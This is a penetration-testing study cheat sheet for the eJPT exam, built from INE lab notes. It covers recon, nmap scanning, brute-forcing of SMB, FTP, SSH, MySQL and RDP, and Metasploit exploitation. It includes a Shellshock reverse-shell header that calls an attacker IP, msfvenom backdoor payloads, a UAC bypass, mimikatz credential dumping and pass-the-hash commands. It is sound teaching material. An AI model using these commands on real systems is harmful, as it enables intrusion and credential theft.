<p align="center">
<img width="60%" src="./certificate.png">
</p>

> **Note**
> These are all the notes I took while following the INE course for eJPT certification, I strongly think everything you need to pass the exam is in this 'cheatsheet'.

Notes by [@!abdu11ah](https://iabdullah.vercel.app/profile), exam passed with 91% score.

Info about ICCA certification [here](https://security.ine.com/certifications/ejpt-certification/).  
Also read my [blog post](https://iabdullah.vercel.app/posts/ICCA-Exam-Review) about eJPT certification.

# eJPT Cheat Sheet

#### Find IP address of a website:

```shell
host <url>
```

> If you see two addresses or ip addresses than that means the website is behind some kind of proxy or firewall like the cloud flare.

#### Whois recon:

```shell
whois <url>
```

> The `whois` command retrieves registration details about a domain name, such as the owner, contact information, and the domain's creation and expiration dates.

#### DNS Recon

```shell
dnsrecon -d <domain>
```

> DNS Dumpster can be used to perform the same function.

#### WAF w00f command:

```shell
wafw00f <url> -a
```

> Will tell whether the web application is protected by a firewall or not. And if its is protected by the firewall than what solution is being used.

#### Sublist3r

```shell
sublist3r -d <domain>
```

> Looks for subdomains on different search engines.

#### Google Dorking:

```shell
site:<domain>
```

> This limits all the searches to a particular domain only. Will also show some subdomains of the particular domain used.

```shell
site:<domain> inurl:<keyword> 
site:ine.com inurl:admin
```

> This can be used to search a particular key word within the domain URL.

```shell
site:*.<domain>
```

> This would not show the domain it self but its subdomains.

```shell
site:*.<domain> intitle:<keyword>
```

> This will search subdomains with a particular key word in its tittle.

```shell
site:*.<domain> filetype:<type>
site:*.ine.com filetype:PDF
```

> Searches for PDFs (particular file type) in subdomains.

```shell
intitle:index of 
```

> This basically tracks the directory listing vulnerability.

```shell
cache:<domain>
```

> This basically shows the older version of the website.

```shell
inurl:auth_user_file.txt
```

> This would enlist all the website with the same `.txt` file. Such files can be used for storing user authentication passwords.

```shell
inurl:wp-config.bak
```

> Can be used to find WordPress Backup Config Files. Can contain passwords for MySQL servers.

#### theHarvester:

```shell
theharvester -d <domain> -b google,yahoo,<any-other>
```

> Looks for emails and names on a particular website.

#### Zoon Transfer:

```shell
dnsenum <domain>
```

> dnsenum can be used to perform a DNS Brute-force as well.

```shell
dig axfr @<name-server> <domain>
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

> `axfr` is the switch for zone transfer.

```shell
fierce -dns <domain>
```

> It can also be used for performing a DNS Brute-force.

#### Host Discovery using Nmap:

```Shell
sudo nmap -sn <ip-address>/<sub-net-if-any>
```

> Pings all the IPs with in the sub-net and shows only ones that ping back.

```Shell
sudo netdiscover -i <interface> -r <ip-address>/<sub-net-if-any>
sudo netdicover -i eth0 -r 192.168.3.0/24
```

> `-i` is used for the interface and `-r` is used for the ip-address range. It uses ARP to scan the hots.

#### Nmap scans:

`nmap`...Then remember:
- `-sS`: SYN scan (Stealth scan, faster than TCP connect)
- `-sT`: TCP connect scan (Standard TCP scan)
- `-sU`: UDP scan (Scan for open UDP ports)
- `-sA`: ACK scan (Checks firewall rules filtered or not) 
- `-sP` or `-sn`: Ping scan (Find online hosts)
- `-sV`: Version detection (Identify services/version info)
- `-sC`: Default script scan (Runs default NSE scripts)
- `-O`: OS detection (Guess the operating system)
- `-p`: Port selection (Scan specific ports)
- `-F`: Fast scan (Scans fewer ports for speed)
- `-f` Fragmentation 
- `-A`: Aggressive scan (OS detection, version detection, script scanning, and traceroute)
- `-D` Decoy.
- `-T<0-5>`: Timing template (Adjusts scan speed, from `0` (paranoid) to `5` (insane))
- `-oN`: Output in normal format (Saves scan output to a file)
- `-oX`: Output in XML format (Saves scan output in XML format)
- `-oG`: Greppable output (Saves scan output in a grep-friendly format)
- `-oA`: Output in all formats (`-oN`, `-oX`, `-oG` combined)
- `-v`: Verbose mode (Displays more information during the scan)
- `-n`: No DNS resolution (Skips DNS resolution)
- `-6`: IPv6 scanning (Scan using IPv6 addresses)
- `-R`: Always resolve DNS (Resolves domain names, even if not needed)
- `-Pn`: No ping (Skips host discovery, assumes hosts are up)
- `-PS` SYN ping.
- `-iL`: Input from a file (Scans hosts listed in a file)
- `-oX -`: Output to stdout in XML format (Useful for piping into other tools)
- `--host-timeout <time>`: Host is skipped if it doesn't responds in the set time periord.
- `--script`: Run specific NSE scripts (For customized scans)
- `--traceroute`: Perform a traceroute (Maps the route to the host)
- `--reason`: Display the reason for each host/port state
- `--osscan-guess`: OS Version probability.

Example:
```bash
nmap -sS -p 1-100,443 192.168.1.13,14
```

Tip: Use `--reason` to show the explanation of why a port is marked open or closed  
Tip: Use `--open` to show only open, open filtered, and unfiltered ports.

```console
nmap -T4 -sS -sV --version-intensity 8 <ip-address>
```

> In Nmap, the `--version-intensity` option controls the intensity of version detection scanning. It takes a value from 0 to 9, where:
   **0**: Lightest intensity, meaning Nmap will try very few probes to determine the service version.
   **9**: The highest intensity, meaning Nmap will use the most comprehensive set of probes to determine the service version.

```bash
nmap -sV -sC 192.168.1.1
```

>TCP Quick Scan

```bash
nmap -sV -sC -p- 192.168.1.1
```

> TCP Full Scan

```bash
nmap -sV -sU 192.168.1.1
```

> UDP Quick Scan

```bash
nmap -sC -p 27017 192.168.1.13 | less
```

> Get info on a particular service:

NMAP Scripts are all available `/usr/share/namp/scripts`.

```Shell
nmap --script=<script-name> <ip-address>
```

> Basic command to run any script.

```Shell
nmap --script=<keyword-*> <ip-address>
nmap --script=ftp-* 10.10.10.10
```

> It is used to run all the scripts related to any keyword.

```Shell
nmap --mtu <size> <target>
nmap --mtu 32 example.com
```

> The `--mtu` flag allows you to set a custom Maximum Transmission Unit (MTU) for the packets that Nmap sends during scanning.

```Shell
nmap demo.ine.local -p 177 -A
```

> We can perform an Nmap port scan on the target system to identify whether the BIND DNS server is open. 

```Shell
nmap 10.0.24.0/20 --open
```

> This command scans the subnet and shows only the open ports of the target.

```Shell
nmap -p 443 --script ssl-heartbleed <ip-address>
```

> This checks that whether the host machine is vulnerable to Heat Bleed Vulnerability or not.

```Shell
nmap --script log4shell.nse --script-args log4shell.callback-server=172.17.42.1:1389 -p 8080 <ip-address>
```

> Log4J Discovery script

#### TCP Commands:

```Shell
netstat -antp        /linux
netstat -ano         /windows
```

> Lists down all the current tcp connections.

#### Ping Sweep:

```shell
ping -b -c 4 <broadcast IP address>
fping -a -g <IP address>/24
```
> Ping Sweep: A technique to identify active hosts in a network range by sending ICMP Echo Requests.

#### SMB Commands:

```Shell
nmap -p445 --script smb-protocols demo.ine.local
```

```Shell
nmap -p445 --script smb-security-mode demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-sessions demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```Shell
nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
```

```CMD
net use Z: \\<ip-address>\C$ smbserver_771 /user:administrator
```

> To mount the SMD user from the CMD.

```Shell
smbmap -u administrator -p smbserver_771 -d . -H demo.ine.local
```

```Shell
smbmap -H demo.ine.local -u administrator -p smbserver_771 -x 'ipconfig'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -L
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -r 'C$'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' -r 'C$'
```

```Shell
smbmap -H demo.ine.local -u Administrator -p 'smbserver_771' --download 'C$\flag.txt'
```

```msfconsole
/auxiliary/scanner/smb/smb_version
```

> This MSF Module can be used to scan the SAMBA or SMB version of a machine

```msfconsole
/auxiliary/scanner/smb/smb_version
```

> This module is used to check whether it supports SMB2 or not.

```msfconsole
/auxiliary/scanner/smb/smb_enumshares
```

> It can used to enumerate shares.

```msfconsole
/auxiliary/scanner/smb/pipe_auditor
```

> This is used to enumerate name pipes or the communications pipes. 

```Shell
nmblookup -A <ip-address>
```

> This can be used to look up SMB connections and Groups.

```shell
smbclient -L <ip-address> -N
```

> Now SMB Client can be used to connect to those sessions and the `-N` Flag looks for the Null sessions.

```Shell
smbclient //<>ip-address>/<user> -N
```

> This allows us to connect to a particular user without any password.

```Shell
rpcclient -U "" -N <ip-address>
```

> RPC Client is used to connect to a server and in this command it is connected with a null user and no password.

`srvinfo`: This rpc command is used to find the server info.
`enumdomusers`: This rpc commands is used to find users in the server.
`lookupnames <keyword>`: It is used to look for a specific username.
`enumdomgroups`: It is used list down all the groups.

```Shell
enum4linux -o <ip-address>
enum4linux -U <ip-address>
enum4linux -U <ip-address>
enum4linux -G <ip-address>
```

> enum4linux in a Linux enum tool and in the above given command we are doing an operating system scan, second one is performing a user scan, the third one is looking for shares, and the last one lists all the user groups.

```msfconsole
use /auciliary/scanner/smb/smb_login
show options
set RHOST <ip-address>
set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
set smb_user <user-name>
exploit
```

> These set of commands from metasploit can be used to brute force a particular SMB user.

```Shell
hydra -l <user-name> -P /usr/share/wordlists/rockyou.txt <ip-address> smb
```

> This hydra command is used brute force a particular SMB user.


#### FTP Commands:

```Shell
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> ftp
```

> It is used to brute force users and their passwords on FTP.

```console
ftp <ip-address>
```

> Can be used to login.

```shell
nmap <ip-address> --script-args userdb=/root/users -p 21 
```

**Note:**

`root/users` has the user(s) that I am sure are present in the system.

> Nmap can be also used to brute force user(s) password(s).

#### SSH Commands:

```Shell
 ssh <user-name>@<ip-address> 
```

> SSH Login

```Shell
nmap --script ssh2-enum-algos demo.ine.local
```

> The script enumerates the supported key exchange, encryption, MAC, and compression algorithms for SSH-2 on the target host.

```Shell
nmap --script ssh-hostkey --script-args ssh hostkey=full demo.ine.local
```

>The script retrieves and displays the full SSH host keys and fingerprints of the target server for security auditing purposes.

```Shell
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<user-name>" demo.ine.local
```

> The script checks and lists the supported SSH authentication methods (e.g., password, public key) for the specified user on the target host.

```Shell
hydra -l <uer-name> -P /usr/share/wordlists/rockyou.txt
```

> SSH Brute force using hydra on a specific user.

```Shell
nmap <ip-address> -p 22 --script ssh-brute --script-args userdb=/root/user
```

**Note:**

`root/users` has the user(s) that I am sure are present in the system.

> Nmap can be also used to brute force user(s) password(s).

```msfconsole
use /auxiliary/scanner/ssh/ssh_login
show options
set RHOST <ip-address>
set userpass_file /usr/share/wordlists/metasploit/root_userpass.txt
set STOP ON SUCCESS true
set verbose true
exploit
```

> These set of commands from metasploit can be used to brute force a particular SSH user.

#### HTTP Commands:

```Shell
whatweb <ip-address>
```

> Running what web tool to find all possible information about the target server.

```Shell
http <ip-address>
```

> We could also use the `httpie` tool to gather target server information.

```Shell
dirp http://<ip-address>
```

> Running the `dirb` tool on the target server port 80 to discover the web server’s directories and subdirectories.

```Shell
browsh --startup-url http://<ip-address>/<sub-domain>
```

> This utility is useful when we don’t have a browser i.e. Firefox, Chrome, etc. to access the target application and we have to use the terminal to access the web application.

```Shell
nmap --script http-enum -sV -p 80 <ip-address>
```

> The command scans port 80 using Nmap to identify HTTP service versions and enumerate potential web directories and files.

```Shell
nmap --script http-headers -sV -p 80 <ip-address>
```

> The command scans port 80 using Nmap to detect service versions `-sV` and retrieve HTTP headers using the `http-headers` script

```Shell
nmap --script http-methods --script-args http-methods.url-path=/webdav/ <ip-address>
```

> The command uses Nmap to scan and check which HTTP methods are allowed on the `/webdav/` URL path by using the `http-methods` script with the specified script arguments.

```Shell
nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/ demo.ine.local
```

> The command uses Nmap to scan for WebDAV vulnerabilities by checking the `/webdav/` URL path using the `http-webdav-scan` script, with the path specified via script arguments.

```msfconsole
use auxiliary/scanner/http/http_version
show options
set RHOST <ip-address>
run
```

> This can be used to scan an Apache server.

```msfconsole
use auxiliary/scanner/http/brute_dirs
show options
set RHOST <ip-address>
run
```

> This can be used to find sub domains

```msfconsole
use auxiliary/scanner/http/robots_txt
show options
set RHOST <ip-address>
run
```

> Will show the data of `robot.txt`

```Shell
curl http://demo.ine.local/
```

> The `curl http://demo.ine.local/` command sends an HTTP GET request to the specified URL (`http://demo.ine.local/`) and returns the response from the server, which typically includes the HTML content of the webpage.

```Shell
lynx http://demo.ine.local
```

> The `lynx http://demo.ine.local` command uses the Lynx web browser, a text-based browser, to access and display the content of the specified URL (`http://demo.ine.local`) in the terminal.

```Shell
dirb http://<ip-address> /usr/share/metasploit-framework/data/wordlists/directory.txt
```

> The command runs `dirb`, a web content scanner, against the specified IP address using a wordlist from Metasploit (`directory.txt`) to discover hidden directories and files on the target web server.

```msfconsole
use exploit/windows/http/rejetto_hfs_exec 
show options
set RHOST <ip-address>
exploit
```

> This module can be used to exploit rejetto http file server. 

```msfconsole
use exploit/windows/http/badblue_passthru
show options
set RHOST <ip-address>
exploit
```

> This can be used to exploit bad blue service.

#### MYSQL Commands:

```Shell
mysql -h <ip-address> -u root
```

> This command can be used to connect to `mysql` through a particular user without any specific password: 

`show databases;`: This command is used to show data bases.
`use <name>;`: This command is used to use a specific data base.
`show tables;`: This command can be used to show the elements of Database. 

```sql
SELECT * FROM table_name;
```

>This command retrieves all the data from a specific table.

```msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_schemadump
set RHOSTS <ip-address>
set USERNAME root
set PASSWORD ""
exploit
```

> Dump the schema of all databases from the server using metasploit module.

```msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
set DIR_LIST /usr/share/metasploit framework/data/wordlists/directory.txt
set RHOSTS <ip-address>
set VERBOSE false
set PASSWORD ""
exploit
```

> Tells if there are any writeable directories or not.

```msfconsole
use auxiliary/scanner/mysql/mysql_file_enum
set RHOSTS <ip-address>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt
set PASSWORD ""
exploit
```

> Tells about any readable files.

```SQL
select load_file("/etc/shadow");
```

> This command reads the contents of the system's `/etc/shadow` file, which stores encrypted password information for Linux user accounts.

```msfconsole
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS <ip-address>
set USERNAME root
set PASSWORD ""
exploit
```

> This is used to list all the users and their passwords hashes.

```Shell
nmap --script=mysql-info -p 3306 <ip-address>
```

> The command retrieves basic information about the MySQL service running on port 3306 of the target host, including the MySQL version, protocol version, and server status.

```Shell
nmap --script=mysql-users --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command attempts to enumerate MySQL user accounts by connecting to the MySQL service on port 3306 of the target host using the provided credentials.

```Shell
nmap --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command attempts to list all the MySQL databases on the target host by connecting to the MySQL service running on port 3306 using the provided credentials.

```Shell
nmap --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''" -p 3306 <ip-address>
```

> The command retrieves and displays MySQL server variables and settings by connecting to the MySQL service on port 3306 of the target host using the provided credentials. These variables include configuration options, server status, and environment settings.

```Shell
nmap --script=mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 <ip-address>
```

> The command audits the MySQL server's security settings on port 3306 of the target host by comparing them against a predefined benchmark using the provided credentials.

```Shell
nmap --script mysql-dump-hashes --script-args="username='root',password=''" -p 3306 <ip-address>
```

> The command attempts to dump MySQL password hashes from the server on port 3306 using the provided credentials (`root` with an empty password).

```Shell
nmap --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''" -p 3306 <ip-address>
```

> The command executes the SQL query `SELECT COUNT(*) FROM books.authors;` on the MySQL server at `demo.ine.local` using the provided credentials (`root` with an empty password).

```msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <ip-address>
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit
```

> Password brute forcing using metasploit

```Shell
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> mysql
```

> Brute force using hydra.

```Shell
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 <ip-address>
```

> The command retrieves NTLM authentication information from the Microsoft SQL Server instance running on port 1433 of the target IP.

```Shell
nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Deskt p/wordlist/100-common-p asswords.txt <ip-address>
```

> Brute Force using NMAP.\

```Shell
nmap -p 1433 --script ms-sql-empty-password <ip-address>
```

> Login through empty password.

```Shell
nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" <ip-address> -oN output.txt gvim output.txt
```

> The command runs a SQL query (`SELECT * FROM master..syslogins`) on the Microsoft SQL Server instance using the `admin` credentials with password `anamaria`, saves the output to `output.txt`, and then opens this file in `gvim`.

```Shell
nmap -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria <ip-address>
```

> The command retrieves password hashes from the Microsoft SQL Server using the provided `admin` credentials with password `anamaria`.

```Shell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" <ip-address>
```

> The command executes the `ipconfig` command on the Microsoft SQL Server at `<ip-address>` using the `admin` credentials with password `anamaria` and the `xp_cmdshell` stored procedure.

```Shell
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" <ip-address>
```

> The command runs `type c:\flag.txt` on the Microsoft SQL Server at using the `admin` credentials with password `anamaria`, which attempts to read and display the contents of `c:\flag.txt` via the `xp_cmdshell` procedure.

```msfconsole
use auxiliary/scanner/mssql/mssql_login 
set RHOSTS <ip-address> 
set USER_FILE /root/Desktop/wordlist/common_users.txt 
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt 
set VERBOSE false exploit
```

> MSSQL brute force using metasploit.

```msfconsole
use auxiliary/admin/mssql/mssql_enum 
set RHOSTS <ip-address>
exploit
```

> Running MSSQL enumeration module to find all possible information.

```msfconsole
use auxiliary/admin/mssql/mssql_enum_sql_logins 
set RHOSTS <ip-address> 
exploit
```

> Extract all MSSQL users.

```msfconsole
use auxiliary/admin/mssql/mssql_exec 
set RHOSTS <ip-address>
set CMD whoami 
exploit
```

> Execute a command using `mssql_exec` module.

```msfconsole
use auxiliary/admin/mssql/mssql_enum_domain_accounts 
set RHOSTS <ip-address> 
exploit
```

> This module dumps the information such as Windows domain users, groups, and computer accounts

#### Exploiting Microsoft IIA WebDAV:

```Shell
hydra -L /usr/share/metasploit/common_user.txt -P /usr/share/metasploit/common_passwords.txt <ip-address> http-get /webdav/
```

> Hydra can be used to brute force `webdav` directory if the authentication is enabled.

```Shell
davtest -url http://<ip-address>/webdav
```

> Can be used to test if `webdav` is present or is accessible without authentication. If it isn't then it will show an error.

```Shell
davtest -auth <user-name>:<password> -url http://<ip-address>/webdav
```

> This will perform a check and will tell what type of files can be uploaded or executed over the server.

```
cadaver http://<ip-address>/webdav
```

> Cadaver can be used to upload files on the server and when you will type this command you will be than asked for a username and a password. After the correct creds. you will get the access to a pseudo shell through which you will be able to interact with the server. 

```Shell
put /usr/share/webshells/asp/webshell.asp
```

> This command can be used in the pseudo shell to upload the web shell on to the server.

```Shell
/usr/share/webshells
```

> This directory has different web shells with in Kali Linux.

```Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=1234 -f asp > <output-file-name>.asp
```

> `msfvenom` command to generate a `.asp` shell code.

```msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set LHOTS <local_ip>
set LPORT 1234
exploit
```

> Msfconsole listener setup.

```msfconsole
use exploit/windows/iis/iis_webdav_upload_asp
show options
set HttpUsername <username>
set HttpPassword <password>
set RHOST <ip-address>
set PATH /webdav/metasploit.asp
exploit
```

> This can be used to automate the whole process of uploading and exploitation.

#### SMB Exploitation:

```msfconsole
use auxiliary/scanner/smb/smb_login
show options
set RHOST <ip-address>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
```

> This module can be used to brute force users on SMB.

```
psexec.py Administrator@<ip-address> cmd.exe
```

> It will ask for the password after this command.

```msfconsole
use exploit/windows/smb/psexec
show options
set RHOST <ip-address>
set SMBUser <username>
set SMBPass <password>
exploit
```

> If you know the user and pass then it will automates the uploading and exploitation phase and gives you a meterpreter shell.

#### Exploiting MS17-010

```Shell
nmap -sV -p 445 --script=smb-vuln-ms17-10 <ip-address>
```

> Scans the machine for MS17-010 Vulnerability. 

```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010
```

> This tool can be used to exploit the vulnerability manually. 

```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show options
set LHOST <host-address>
set RHOST <ip-address>
exploit
```

#### RDP Exploitation:

```msfconsole
search auxiliary/scanner/rdp/rdp_scanner
show options
set RHOST <ip-address>
set RPORT <port-number>
run
```

> This will tell whether a specific port is running RDP or not.

```Shell
hydra -L /usr/share/metasploit/common_user.txt -P /usr/share/metasploit/unix_passwords.txt rdp://<ip-address> -s 3333
```

> Command to brute force RDP.

```Shell
xfreerdp /u:administrator /p:<password> /v:<ip-address>:3333
```

> Command can be used to connect to RDP.

#### Exploit Blue Keep:

```msfconsole
use auxiliara/scanner/rdp/cve_2019_0708_bluekeep
show options
set RHOST <ip-address>
run
```

> It is a Blue Keep Vulnerability scanner.

```msfconsole
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOST <ip-address>
show target 
set target <target-number>
exploit
```

> Module can be used to exploit the vulnerability and then get access. 

#### Exploiting WinRM:

```Shell
crackmapexec winrm <ip-address> -u administrator -p /usr/share/metasploit/unix_passwords.txt
```

> WinRM brute force command using `crackmapexec`.

```Shell
crackmapexec winrm <ip-address> -u administrator -p <password>
```

> This command can be used to execute arbitrary command on the windows machine.

```Shell
eveil-winrm.rb -u administrator -p '<password>' -i <ip-address>
```

> This will automatically provide us a command shell session.

```msfconsole
use exploit/windows/winrm/winrm_script_exec
show options
set RHOST <ip-address>
set FORCE_VBS true
set USERNAME administrator
set PASSWORD <password>
exploit
```

> This will provide us with a shell session as well.

```msfconsole
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

> Can be used to brute force the creds.

```msfconsole
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
```

> Checking WinRM supported authentication method using an auxiliary module.

```msfconsole
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
```

> Can be used to execute remote commands.

#### Windows Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

This is a built in meterpreter command i.e. `getsystem` that uses some techniques to escalate the privileges. It can used in some cases as well. 

```msfconsole
use post/multi/recon/local_exploit_suggester
show options
set SESSION <session-ID>
run
```

> It will tell the exploit modules that you can try to elevate your privileges.

```msfconsole
use exploit/windows/local/ms16_014_wmi_recv_notif
show options
set SESSION <session-ID>
set LPORT <port-number>
exploit
```

> It can be used to escalate privileges in vulnerable windows 7 machine.

```Shell
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

> This tool compares a target path levels with Microsoft vulnerability database in order to detect missing patches on the target that can be then exploited.

**How to use:**

First get the system info from the meterpreter session by `shell > systeminfo`. Then copy this info in a text file and then pass this as an argument to the tool.

**Step 01:**

```Shell
$ ./windows-exploit-suggester.py --update
[*] initiating...
[*] successfully requested base url
[*] scraped ms download url
[+] writing to file 2014-06-06-mssb.xlsx
[*] done
```

**Step 02:**

```Shell
install python-xlrd, $ pip install xlrd --upgrade
```

**Step 03:**

```Shell
./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
```

#### Bypassing UAC with UACMe:

***UAC STANDS FOR USER ACCOUNT CONTROL***

```meterpreter
pgrep explorer
migrate <process-ID>
```

> This command can be used to switch to the 64 Bit meterpreter session.

```Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
```

> Generating malicious executable using msfvenom.

```console
/root/Desktop/tools/UACME/Akagi64.exe
```

> Location of the `Akagi` exploit that is used to bypass UAC.

```Shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
```

> `Akagi` command is used to run the exploit by bypassing the UAC.

```CMD
ps -S lsass.exe
migrate <process-ID>
```

> After the exploitation and meterpreter session migrate to the `lsass.exe` process.

#### Access Token Impersonation:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

***YOU HAVE TO PERFROM THE FOLLOWING FUNCTION IN THE METERPRETER SESSION. YOU CAN TO FOLLOWING IF AND ONLT IF YOU HAVE THE `SeImpersonationPrivilages` IN THE `getprivs` SECTION***

```msfconsole
load incognito
list_tokens -u
impersonate_token "<group-name>\Administrator"
getuid
pgrep explorer
migrate <process-id>
```

***IF YOU DONT FIND ANY PRIVILAGED TOKENS IN BOTH DELEGATION TOKENS AND IMPERSONANTION TOKENS THAN YOU HAVE TO USE THE POTATO ATTACK***

#### Searching for Passwords In Windows Configuration Files:

***YOU NEED ELIVATED PRIVILEGES TO DUMP HASHES***

```Shell
C:\\Windows\Panther\Unattend.xml >> in base64
C:\\Windows\Panther\Autounattend.xml
```

> These are the configuration files that contain the user accounts and their passwords along side system configuration. In unattend the passwords are stored in base64.

#### Dumping hashes with Mimikatz:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.


```msfconsole
load kiwi
?
creds_all
lsa_dump_sam
lsa_dump_secrets
```

> Dumping passwords hashes using `kiwi`.

```msfconsole
upload usr/share/windows-resources/mimikatz/mimikatz.exe
shell
dir
mimikatz.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

> Command can be used to upload the `mimikatz.exe` file and then run it in the windows shell.

#### Pass-The-Hash:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold and after getting the hashes from the kiwi module. Make sure to make a file to store all the hashes in it.


```msfconsole
use exploit/windows/smb/psexec
show options
set LPORT <some-new-port>
set RHOST <ip-address>
set SMBUser Administrator <any-other-user-can-be-used>
set SMBPass <NTLM-HASH:LM-HASH>
set target Native\ upload
exploit
```

> Via these commands if everything goes smoothly you'll have a successful pass-the-hash attack.

```Shell
crackmapexec smb <ip-address> -u Administrator -H "<NTLM-HASH>" -x "any-command"
```

> Pass-the-hash attack using `crackmapexec`.

```Shell
ruby evil-winrm.rb -i 10.0.0.20 -u user -H <NTLM-HASH>
```

> `evil-winrm.rb` tool can be used to perform the same function.

#### Linux Exploitation:

#### Shell Shock:

```Shell
nmap -sV <ip-address> --script=http-shellshock --sctipt-args "http-shellshock.uri=/gettime.cgi"
```

> A shell shock vulnerability script.

***TO EXPLOIT IT VIA BRUP SUITE WE HAVE TO PASS COMMANDS IN THE  USER AGENT HEADER AS SHOWN BELOW***

> First send it to the repeater and then change the header in the repeater tab. 

```HTTP
User Agent: () { :; }; echo; echo; /bin/bash -c '<command>'
User Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/password' 
```

***FOLLOWING IS THE METHOD TO GAIN A REVERSE SHELL FROM BURP SUITE***

```Shell
nc -nvlp 1234
```

> First turn on the net cat on listening mod on port 1234.

```http
User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/<host-ip-addresss>/1234 0>&1'
User Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.24.241.2/1234 0>&1'
```

> This header upon running will give a reverse shell on the system.

```msfconsole
use exploit/multi/http/apache_mod_cgi_bach_env_exec
show options
set RHOST <ip-address>
set TARGETURI /gettime.cgi
exploit
```

> Module for exploitation the shellshock vulnerability. 

#### SAMBA Commands:

```Shell
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip-address> smb
```

> Brute force samba command.

```Shell
smbmap -H <ip-address> -u <user-name> -p password1
```

> List downs all the shares of the given user.

```Shell
smbclient //<ip-address>/<share-name> -U admin 
```

> This command be used to connect to a particular share.

```Shell
enum4linux -a <ip-address>
```

> Basic target information.

```Shell
enum4linux -a -u <user-name> -p <password> <ip-address>
```

> For a particular user.

#### Linux Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

```meterpreter
upload les.sh
shell
